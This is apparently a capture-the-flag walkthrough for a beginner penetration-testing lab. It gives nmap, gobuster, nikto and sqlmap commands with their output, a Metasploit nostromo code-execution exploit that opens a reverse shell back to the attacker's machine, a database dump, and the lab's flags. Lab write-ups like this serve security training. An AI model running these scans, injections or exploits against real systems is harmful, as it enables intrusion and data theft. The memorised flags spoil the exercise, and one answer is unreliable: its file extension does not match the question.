> CC: Pen Testing

# Nmap

```
export IP=10.10.21.71
```

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

# Gobuster

1. What is the name of the hidden directory?

sudo gobuster -u http://10.10.72.23 -k -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -o gobuster_output

```
/index.html (Status: 200)
/secret (Status: 301)
``` 	

2. What is the name of the hidden file with the extension xxa?

sudo gobuster -u http://10.10.72.23 -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -t 20 -x xxa

```
password.xaa
```

# Nikto

nikto -h 10.10.72.23 apacheusers

```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.72.23
+ Target Hostname:    10.10.72.23
+ Target Port:        80
+ Start Time:         2020-09-10 15:17:54 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2c39 0x5989ac7b70f1d 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /secret/: Directory indexing found.
+ OSVDB-3092: /secret/: This might be interesting...
```

# Metasploit

msfconsole

```
use exploit/multi/http/nostromo_code_exec
set LHOST 10.9.12.130
set LPORT 4444
set RHOSTS 10.10.220.124
set TARGETURI /
exploit
```

1. What is the name of the secret directory in the /var/nostromo/htdocs directory?

```
s3cretd1r
```

2. What are the contents of the file inside of the directory?

```
Woohoo!
```

# Sqlmap

1. How many types of sqli is the site vulnerable too?

sudo sqlmap -u  http://10.10.177.183 --forms

```
[16:38:28] [INFO] heuristic (basic) test shows that POST parameter 'msg' might be injectable (possible DBMS: 'MySQL')
[16:38:29] [INFO] heuristic (XSS) test shows that POST parameter 'msg' might be vulnerable to cross-site scripting (XSS) attacks
[16:44:22] [INFO] POST parameter 'msg' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
```

2. Dump the database.

sudo sqlmap -u http://10.10.177.183 --forms -a

```
current database: 'tests'
[16:47:45] [INFO] fetching server hostname
[16:47:45] [INFO] retrieved: 'ubuntu'
```

3. How many tables are in the database?


sudo sqlmap -u http://10.10.177.183 --forms -D tests --dump

```
Database: tests
Table: lol
[1 entry]
+----------+
| flag     |
+----------+
| found_me |
+----------+
[16:52:45] [INFO] table 'tests.lol' dumped to CSV file '/root/snap/sqlmap/7/.local/share/sqlmap/output/10.10.177.183/dump/tests/lol.csv'
[16:52:45] [INFO] fetching columns for table 'msg' in database 'tests'
[16:52:45] [INFO] retrieved: 'msg'
[16:52:46] [INFO] retrieved: 'varchar(100)'
[16:52:46] [INFO] fetching entries for table 'msg' in database 'tests'
[16:52:46] [INFO] retrieved: 'msg'
[16:52:47] [INFO] retrieved: 'test'
Database: tests
Table: msg
[2 entries]
+------+
| msg  |
+------+
| msg  |
| test |
+------+
```